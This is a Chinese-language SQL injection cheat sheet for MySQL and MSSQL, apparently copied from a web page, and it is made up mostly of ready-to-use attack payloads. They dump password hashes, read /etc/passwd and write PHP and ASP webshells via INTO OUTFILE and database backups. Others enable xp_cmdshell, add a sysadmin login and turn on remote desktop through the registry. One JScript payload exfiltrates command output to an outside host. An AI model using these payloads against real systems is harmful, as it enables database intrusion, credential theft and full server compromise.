#SQL注入常用语句

##SQL注入基础知识
所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。[1] 比如先前的很多影视网站泄露VIP会员密码大多就是通过WEB表单递交查询字符暴出的，这类表单特别容易受到SQL注入式攻击．

##MySQL
**基本环境信息**

	#获取版本号
	SELECT @@version
	SELECT version()
	
	#主机名，IP地址
	SELECT @@hostname;
	
	#数据目录
	SELECT @@datadir;
	
	#用户名及密码
	SELECT host, user, password FROM mysql.user;
	 
	#用户名
	SELECT user();
	SELECT system_user();
	SELECT user FROM mysql.user;

**用户权限相关**
	
	#列举用户权限]
	SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges;

	#列举用户权限
	SELECT host, user, Select_priv, Insert_priv,  
	Update_priv, Delete_priv, Create_priv, Drop_priv,  
	Reload_priv, Shutdown_priv, Process_priv, File_priv,  
	Grant_priv, References_priv, Index_priv, Alter_priv,  
	Show_db_priv, Super_priv, Create_tmp_table_priv,  
	Lock_tables_priv, Execute_priv, Repl_slave_priv,  
	Repl_client_priv FROM mysql.user;

	#列举数据库权限
	SELECT grantee, table_schema, privilege_type FROM  
	information_schema.schema_privileges;

	#列举 columns_priv**
	SELECT table_schema, table_name, column_name, privilege_type FROM  
	information_schema.column_privileges;
	
**列举数据库**

	#当前库**
	SELECT database();
	#所有库 (Mysql>5.0)
	SELECT schema_name FROM information_schema.schemata;
**列举表名**

	#常规
	SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema  
	!= 'mysql' AND table_schema != 'information_schema'

	#根据列名找表名**
	SELECT table_schema, table_name FROM information_schema.columns WHERE   
	column_name = 'username';

**列举字段名**

	SELECT table_schema, table_name, column_name FROM information_schema.columns   
	WHERE table_schema != 'mysql' AND table_schema != 'information_schema'

**单条数据获取**

	SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0;
	SELECT host,user FROM user ORDER BY host LIMIT 0,1;
	#LIMIT 偏移,行数
	#LIMIT 行数 OFFSET 偏移
**显错注入**

	#方式1
	and (select 1 from (select count(*),concat(SQL语句,floor(rand(0)*2))x  
	from information_schema.tables group by x)a);
	
	#方式2
	and (select count(*) from (select 1 union select null  
	union select !1)x group by concat(sql语句,floor(rand(0)*2)));

	#方式3
	and extractvalue(1, concat(0x5c, (SQL语句)));

	#方式4
	and 1=(updatexml(1,concat(0x5e24,(SQL语句),0x5e24),1));
	
	#对于1, 原始的报错语句如下：
	select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;
	count(*)    x
	1           5.1.28-rc-community1
	1           5.1.28-rc-community0
	1           5.1.28-rc-community1  <-- 出现重复的x值。报错。

**延时注入**

	SELECT BENCHMARK(1000000,MD5('A'));
	SELECT SLEEP(5); # >= 5.0.12

**文件读写**

	#读取文件，需要相关权限
	UNION SELECT LOAD_FILE('/etc/passwd')
	
	#写入文件，需要相关权限
	SELECT * FROM mytable INTO dumpfile '/tmp/somefile'
	
	#写入文件，需要相关权限
	SELECT * FROM mytable INTO outfile '/tmp/somefile'

	#小马形式1
	?id=1 and 1=2 union select 1,'<?php eval(_POST[cmd])?>',3,4,5,6 into outfile  '/xx/x.php'/*

	#小马形式2
	?id=1 and 1=2 union select 1,char(60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,63,62),3,4,5,6 into outfile '/xx/x.php'/*

	#小马形式3
	?id=1 and 1=2 union select 1,0x3C3F706870206576616C28245F504F53545B636D645D293F3E,3,4,5,6 into outfile '/www/home/html/coder.php'/*
**判断及字符串相关**

	#if判断
	SELECT if(1=1,'foo','bar'); #返回foo

	#case when 判断
	SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END; # 返回A

	#char函数，将数字转变为字符
	SELECT char(65); #返回A

	#ascii函数，将字符转变为数字
	SELECT ascii('A'); #返回65

	#concat函数，将字符连接在一起
	SELECT CONCAT('A','B'); #returns AB

	#字符串的16进制写法
	SELECT 0×414243; # 返回 ABC

	#substring/substr函数
	SELECT substr('abcd', 3, 1); #返回c
	
	#length函数
	SELECT length('abcd'); #返回4


##MSSQL
**基本环境信息**

	#数据库版本
	SELECT @@version

	#主机名，IP地址
	SELECT HOST_NAME()

	#当前用户
	SELECT user_name();
	SELECT system_user;
	SELECT user;
	SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID
	
	#列出所有用户
	SELECT name FROM master..syslogins

	#列密码 mssql 2000
	SELECT name, password FROM master..sysxlogins  --*
	SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins --*

	#列密码 mssql 2005
	SELECT name, password_hash FROM master.sys.sql_logins --*
	SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from  
	master.sys.sql_logins --*
	
	#1. 语句末尾加 --* 表示需要管理权限才能执行的语句
	#2. MSSQL 2000 and 2005 Hashes are both SHA1-based
**列举数据库**

	#当前库
	SELECT DB_NAME()
	
	#列举库
	SELECT name FROM master..sysdatabases;
	SELECT DB_NAME(N); — 其中N = 0, 1, 2,
	
	#默认系统库有以下：
	northwind
	model
	msdb
	pubs — sql server 2005 没有此库
	tempdb
**列举表名**
	
	#列举表
	SELECT name FROM 库名..sysobjects WHERE xtype = 'U';

	#根据字段名列表名
	SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM 库名..sysobjects   
	JOIN 库名..syscolumns ON 	sysobjects.id = syscolumns.id WHERE sysobjects.xtype = 'U' AND   
	syscolumns.name LIKE '%字段名%'
	
**列举字段名**

	#列举当前库中的表的字段
	SELECT name FROM syscolumns WHERE id = (SELECT id FROM 	sysobjects WHERE name = '表名');

	#列举master库中的表的字段
	SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM   
	master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id   
	AND master..sysobjects.name='表名';

**单条数据获取**

	#获取第 NNN 条数据
	SELECT TOP 1 name FROM (SELECT TOP NNN name FROM master..syslogins ORDER BY name ASC) sq   
	ORDER BY name DESC

**权限相关**
	
	#判断当前用户权限
	SELECT is_srvrolemember('sysadmin');
	SELECT is_srvrolemember('dbcreator');
	SELECT is_srvrolemember('bulkadmin');
	SELECT is_srvrolemember('diskadmin');
	SELECT is_srvrolemember('processadmin');
	SELECT is_srvrolemember('serveradmin');
	SELECT is_srvrolemember('setupadmin');
	SELECT is_srvrolemember('securityadmin');

	#判断某指定用户的权限
	SELECT is_srvrolemember('sysadmin', 'sa');

	#判断是否是库权限
	and 1=(Select IS_MEMBER('db_owner'))

	#判断是否有库读取权限
	and 1= (Select HAS_DBACCESS('master'))

	#获取具有某个权限的用户名
	SELECT name FROM master..syslogins WHERE denylogin = 0;
	SELECT name FROM master..syslogins WHERE hasaccess = 1;
	SELECT name FROM master..syslogins WHERE isntname = 0;
	SELECT name FROM master..syslogins WHERE isntgroup = 0;
	SELECT name FROM master..syslogins WHERE sysadmin = 1;
	SELECT name FROM master..syslogins WHERE securityadmin = 1;
	SELECT name FROM master..syslogins WHERE serveradmin = 1;
	SELECT name FROM master..syslogins WHERE setupadmin = 1;
	SELECT name FROM master..syslogins WHERE processadmin = 1;
	SELECT name FROM master..syslogins WHERE diskadmin = 1;
	SELECT name FROM master..syslogins WHERE dbcreator = 1;
	SELECT name FROM master..syslogins WHERE bulkadmin = 1;

	#当前所拥有的权限
	SELECT permission_name FROM master..fn_my_permissions(null, 'DATABASE'); — current database
	SELECT permission_name FROM master..fn_my_permissions(null, 'SERVER'); — current server
	SELECT permission_name FROM master..fn_my_permissions('master..syslogins', 'OBJECT'); –permissions on a table
	SELECT permission_name FROM master..fn_my_permissions('sa', 'USER');

	备注：
	/*服务器角色*/
	sysadmin
	--在 SQL Server 中进行任何活动。该角色的权限跨越所有其它固定服务器角色。 
	serveradmin 
	--配置服务器范围的设置。 
	setupadmin 
	--添加和删除链接服务器，并执行某些系统存储过程（如 sp_serveroption）。 
	securityadmin 
	--管理服务器登录。 
	processadmin 
	--管理在 SQL Server 实例中运行的进程。 
	dbcreator 
	--创建和改变数据库。 
	diskadmin 
	--管理磁盘文件。 
	bulkadmin 
	--执行 BULK INSERT 语句。

	/*数据库角色*/
	public
	public 角色
	--public 角色是一个特殊的数据库角色，每个数据库用户都属于它。public 角色： 
	--捕获数据库中用户的所有默认权限。
	--无法将用户、组或角色指派给它，因为默认情况下它们即属于该角色。
	--含在每个数据库中，包括 master、msdb、tempdb、model 和所有用户数据库。
	--无法除去。
	db_owner 
	--进行所有数据库角色的活动，以及数据库中的其它维护和配置活动。
	--该角色的权限跨越所有其它固定数据库角色。
	db_accessadmin 
	--在数据库中添加或删除 Windows NT 4.0 或 Windows 2000 组和用户以及 SQL Server 用户。 
	db_datareader 
	--查看来自数据库中所有用户表的全部数据。
	db_datawriter 
	--添加、更改或删除来自数据库中所有用户表的数据
	db_ddladmin 
	--添加、修改或除去数据库中的对象(运行所有 DDL)
	db_securityadmin 
	--管理 SQL Server 2000 数据库角色的角色和成员，并管理数据库中的语句和对象权限
	db_backupoperator 
	--有备份数据库的权限
	db_denydatareader 
	--拒绝选择数据库数据的权限
	db_denydatawriter
	--拒绝更改数据库数据的权限 
**显错注入**

	#直接与数字比较
	id=1 and @@version>0--
	id=1 and user>0--
	id=1 and db_name()>0--

	#将数据转换成整数致报错,可用于爆库名，表名，数据名
	id=1 and 1=convert(int,(select name from master.dbo.sysdatabases where dbid=7))--

	#having 1=1爆数据
	id=13 having 1=1 --
	id=13 group by 表名.字段名1,字段名2 having 1=1 --

**延时注入**
	
	#延时3秒**
	IF(ascii(SUBSTRING('name',1,1))>0) waitfor delay'0:0:3'

**命令执行**
	
	#判断功能是否存在
	and select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
	and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_regread') #注册表
	and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'sp_makewebtask') #备份
	and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'sp_addextendedproc') #恢复扩展
	and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_subdirs') #读取子目录
	and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_dirtree') #列目录

	#恢复与删除扩展
	exec sp_addextendedproc xp_cmdshell,'xplog70.dll'
	exec sp_dropextendedproc 'xp_cmdshell'

	#恢复xp_cmdshell
	EXEC sp_configure 'show advanced options', 1;  
	RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'xp_cmdshell', 1;  
	RECONFIGURE WITH OVERRIDE;  
	EXEC sp_configure 'show advanced options', 0 --

	#访问COM组件
	;declare @s int;
	;exec sp_oacreat 'wscript.shell',@s
	;exec master..spoamethod @s,'run',null,'cmd.exe/c dir c:\

	#执行命令
	EXEC xp_cmdshell 'net user';

	#写注册表
	exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE',  
	'SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;--

	#读注册表
	create table labeng(lala nvarchar(255), id int);
	DECLARE @result varchar(255) EXEC master.dbo.xp_regread 'HKEY_LOCAL_MACHINE',  
	'SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots','/',  
	@result output insert into labeng(lala) values(@result); #读网站目录

	#写shell
	exec master.dbo.xp_cmdshell 'echo ^<%eval request("o")%^> >E:\wwwroot\1.asp'; --

	#停掉或激活某个服务
	exec master..xp_servicecontrol 'stop','schedule'
	exec master..xp_servicecontrol 'start','schedule'

	#添加、删除、设置用户为DBA的操作
	EXEC sp_addlogin 'user', 'pass';
	EXEC sp_droplogin 'user';
	EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin';

	#获取DB文件位置信息
	EXEC sp_helpdb master; -- master.mdf位置
	


**文件读写**

	#文件读取 (创建临时表，bulk insert读取内容到表)
	CREATE TABLE mydata (line varchar(8000));
	BULK INSERT mydata FROM 'c:\boot.ini';
	DROP TABLE mydata;

	#文件读取 (创建临时表，insert & xp_cmdshell读取内容)
	create table mytmp(data varchar(4000)); --
	insert mytmp exec master.dbo.xp_cmdshell 'ipconfig /all'; --

	#页面无回显时，读取命令执行内容 (需目标机器可连外网) (先写入JS，然后通过执行JS将命令执行内容，通过ajax发送给接收端)
	exec master.dbo.xp_cmdshell 'echo (function(){var ws=new ActiveXObject("WScript.shell"),  
	cmd="cmd.exe /c dir c:\\";var data=ws.exec(cmd).stdout.ReadAll();  
	var ajax=new ActiveXObject("Microsoft.xmlhttp");  
	ajax.open("POST","http://itsokla.duapp.com/cmd.php",false);  
	ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");  
	ajax.send("cmd="+encodeURIComponent(cmd)+"&data="+encodeURIComponent(encodeURIComponent(data)));})() > c:\e.js' --

**差异备份**

	#差异备份
	1. 将数据库备份一次,路径随便
	backup database 库名 to disk = 'c:\xxxxx.bak';--
	2. 创建临时表，并写入shell内容
	create table [dbo].[dtest] ([cmd] [image]);
	insert into dtest(cmd) values(0x3C25657865637574652872657175657374282261222929253E);--
	3. 差异备份，将新增内容，备份至SHELL
	backup database 库名 to disk='目标位置\d.asp' WITH DIFFERENTIAL,FORMAT;--
	
	#log备份
	1. 设置数据库恢复模式为FULL
	alter database 当前库名 set RECOVERY FULL--
	2. 创建临时表
	create table cmd (a image)--
	3. 备份日志一次
	backup log 当前库名 to disk = 'f:\cmd' with init--
	4. 在表内插入shell内容
	insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253EDA)--
	5. 再次备份日志
	backup log 当前库名 to disk = '备份路径'--
	6. 删除临时表
	drop table cmd--
	7. 改变数据库恢复模式为SIMPLE
	alter database 当前库名 set RECOVERY SIMPLE--

**判断字符串及相关**

	#取子字符串
	SELECT substring('abcd', 3, 1) --返回c
	
	#ascii转char
	SELECT char(0x41) -- 返回A
	SELECT char(65) -- 返回A
	
	#char转ascii
	SELECT ascii('A') -- 返回65
	
	#类型转换
	SELECT CAST('1' as int);
	SELECT CAST(1 as char);
	CONVERT (数据类型,表达式)
	
	#字符串连接
	SELECT 'A' + 'B' – returns AB
	
	#位运算
	SELECT 6 & 2 — returns 2
	SELECT 6 & 1 — returns 0
	
	#if 判断
	IF (1=1) SELECT 1 ELSE SELECT 2 — returns 1
	
	#case 判断
	SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END — returns 1
	备注：
		字符串相关函数索引
	-------------------------------
	ASCII 
	返回字符表达式最左端字符的 ASCII 代码值
	NCHAR 
	根据 Unicode 标准所进行的定义，用给定整数代码返回 Unicode 字符。
	SOUNDEX 
	返回由四个字符组成的代码 (SOUNDEX) 以评估两个字符串的相似性。
	CHAR
	将 int ASCII 代码转换为字符的字符串函数。 
	PATINDEX 
	返回指定表达式中某模式第一次出现的起始位置；如果在全部有效的文本和字符数据类型中没有找到该模式，则返回零。
	SPACE
	返回由重复的空格组成的字符串。
	CHARINDEX
	返回字符串中指定表达式的起始位置。
	REPLACE
	用第三个表达式替换第一个字符串表达式中出现的所有第二个给定字符串表达式。
	STR 
	由数字数据转换来的字符数据。
	DIFFERENCE
	以整数返回两个字符表达式的 SOUNDEX 值之差。
	QUOTENAME
	返回带有分隔符的 Unicode 字符串，分隔符的加入可使输入的字符串成为有效的 Microsoft® SQL Server™ 分隔标识符。
	STUFF
	删除指定长度的字符并在指定的起始点插入另一组字符。
	LEFT 
	返回从字符串左边开始指定个数的字符。
	REPLICATE
	以指定的次数重复字符表达式。
	SUBSTRING 
	返回字符、binary、text 或 image 表达式的一部分。有关可与该函数一起使用的有效 Microsoft® SQL Server™ 数据类型的更多信息，请参见数据类型。
	LEN 
	返回给定字符串表达式的字符（而不是字节）个数，其中不包含尾随空格。
	REVERSE 
	返回字符表达式的反转
	UNICODE 
	按照 Unicode 标准的定义，返回输入表达式的第一个字符的整数值。 
	LOWER 
	将大写字符数据转换为小写字符数据后返回字符表达式。
	RIGHT 
	返回字符串中从右边开始指定个数的 integer_expression 字符。
	UPPER
	返回将小写字符数据转换为大写的字符表达式
	LTRIM
	删除起始空格后返回字符表达式。
	RTRIM   
	截断所有尾随空格后返回一个字符串。

##ACCESS
暂无
##ORACLE
暂无
##PGSQL
暂无
##INGRES
暂无
##DB2
暂无
##INFORMIX
暂无

来源:http://xsst.sinaapp.com/sql/